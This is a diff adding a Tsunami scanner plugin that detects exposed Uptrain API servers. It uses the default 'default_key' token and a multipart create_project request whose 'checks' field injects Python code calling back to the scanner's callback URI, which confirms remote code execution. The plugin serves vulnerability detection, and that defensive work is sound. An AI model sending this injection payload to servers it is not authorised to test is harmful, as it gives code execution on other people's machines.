@@ -1,0 +1,116 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Uptrain_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "lancedD00m for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "Uptrain_ExposedUI"
+  }
+  severity: CRITICAL
+  title: "Exposed Uptrain API Server"
+  description: 
+    "An exposed Uptrain API server can be exploited by attackers to create a"
+    " project with malicious AI Model. This can lead to remote code execution"
+    " on the server."
+  recommendation:
+    "Set proper authentication for the Uptrain API server and "
+    "ensure the API is not publicly exposed through a "
+    "misconfigured reverse proxy."
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_uptrain"
+  http_request: {
+    method: GET
+    uri: "/api/public/project_runs"
+    headers: [
+      { name: "uptrain-access-token" value: "default_key" }
+    ]
+    response: {
+      http_status: 422
+      expect_all: {
+        conditions: [
+          { 
+            body {} 
+            contains: '"detail":[{"type":"missing","loc":["query","project_id"],"msg":"Field required","input":null}]'
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_command"
+  http_request: {
+    method: POST
+    uri: "/api/public/create_project"
+    headers: [
+      { name: "uptrain-access-token" value: "default_key" },
+      { name: "Content-Type" value: "multipart/form-data; boundary=----WebKitFormBoundarysFz2W1h9iMH4IFs9" }
+    ]
+    data:
+      "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\n"
+      "Content-Disposition: form-data; name=\"model\"\r\n\r\n"
+      "gpt-3.5-turbo\r\n"
+      "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\n"
+      "Content-Disposition: form-data; name=\"project_name\"\r\n\r\n"
+      "asdf\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\n"
+      "Content-Disposition: form-data; name=\"checks\"\r\n\r\n"
+      "__import__(\'requests\').get(\'{{ T_CBS_URI }}\')\r\n"
+      "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\n"
+      "Content-Disposition: form-data; name=\"dataset_name\"\r\n\r\n"
+      "asdf\r\n"
+      "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\n"
+      "Content-Disposition: form-data; name=\"data_file\"; filename=\"test.jsonl\"\r\n"
+      "Content-Type: application/octet-stream\r\n\r\n\r\n"
+      "------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\n"
+      "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
+      "{\"gpt-3.5-turbo\":{\"openai_api_key\":\"asdf\"}}\r\n"
+      "------WebKitFormBoundarysFz2W1h9iMH4IFs9--\r\n"
+    response: {
+      http_status: 500
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_uptrain",
+    "execute_command",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
